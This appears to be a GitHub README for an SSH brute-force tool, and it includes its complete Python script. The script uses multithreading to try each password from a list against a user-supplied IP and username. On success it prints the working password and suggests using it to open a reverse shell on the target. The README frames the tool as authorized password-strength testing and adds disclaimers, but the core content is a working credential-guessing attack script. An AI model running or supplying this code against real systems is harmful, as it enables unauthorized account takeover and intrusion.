# SSH Brute-Force Tool
<img src="https://i.imgur.com/ObZWqy6.png" alt="Explanation Brute Force Attack" width="100%" height="500px">

💻Brute Force Pen Testing systems for gaining control over system or computer commands 💻

## Description:
This project is a security tool designed to test the strength of passwords in a system by attempting to establish SSH connections using a list of provided passwords. Its primary aim is to help administrators identify and rectify weak passwords, thereby enhancing system security.

## :warning: Ethical & Legal Consideration
This tool is intended for educational and authorized testing purposes only. Unauthorized access to computer systems is illegal and unethical. Ensure you have explicit permission to perform testing on any system or network.

## :hammer_and_wrench: Features
- **Brute-Force Attack**: Attempts to establish SSH connections using a list of passwords.
- **Multi-Threading**: Uses threading to increase the speed of password testing.
- **User Input**: Takes user input for target IP, SSH username, and password file.
- **Output Coloring**: Provides colored terminal output for better readability.

## :gear: Dependencies
- `paramiko`: For automating SSH connections.
- `termcolor`: For coloring terminal output.
- `threading`: For utilizing multi-threading.

## :clipboard: Usage

1. Clone this repository.
   ```bash
   git clone git@github.com:bryanmax9/Brute_Force_SSH-Python.git
   cd Brute_Force_SSH-Python
   ```
2. Install the dependencies.
   ```bash
   pip install paramiko termcolor
   ```
3. Run the script.
   ```bash
   python bruteForce.py
   ```
4. Follow the on-screen prompts to enter the target IP, SSH username, and password file.

## :page_facing_up: Code

```python
import paramiko, sys, os, socket, termcolor
import threading, time

stop_flag = 0

def ssh_connect(password, code=0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored((f"👻 Succesful SSH connection using the password={password} with username={username}"), "green"))
        print("Now use this information to make a reverse shell to that IP with the user and password 👀")
    except:
        print(termcolor.colored((f"☠️ incorrect password={password} "), "red"))
    
    ssh.close()

if __name__ == '__main__':
    host = input("🐧IP address of the machine you want to BruteForce ssh: ")
    username = input("SSH Username: ")
    input_file = input("🔬Enter name of the file with passwords to try: ")

    if os.path.exists(input_file) == False:
        print(f"File with name {input_file} dosent exist 🫠")
        sys.exit(1)
    
    print(f'''
    🐧STARTING BRUTE FORCE🐧
    IP: {host}
    username: {username}
    cmd command:
    $ ssh {username}@{host}
    {username}@{host}'s password:
    ''')

    with open(input_file, "r") as file:
        for inLinePassword in file.readlines():
            if stop_flag == 1:
                t.join()
                exit()
            password = inLinePassword.strip()
            t = threading.Thread(target=ssh_connect, args=(password,))
            t.start()
            time.sleep(0.5)
```

## :bulb: Recommendations for Use
- **Permission**: Always obtain explicit permission before testing.
- **Notification**: Notify stakeholders about the testing and its potential impact.
- **Responsibility**: Use the tool responsibly to improve security.
- **Rate Limiting**: Implement rate limiting to prevent overwhelming the target system.
- **Logging**: Enable logging for tracking attempts and outcomes.
- **Testing Environment**: Initially, test the tool in a controlled and isolated environment.

## :shield: Security Practices
- Avoid exposing sensitive information.
- Regularly update dependencies to their latest secure versions.
- Validate user inputs and ensure password files contain valid passwords.

## :exclamation: Disclaimer
This tool is provided "as is", without warranty of any kind. It is to be used responsibly, ethically, and legally. The author is not responsible for any misuse or damage caused by this tool.

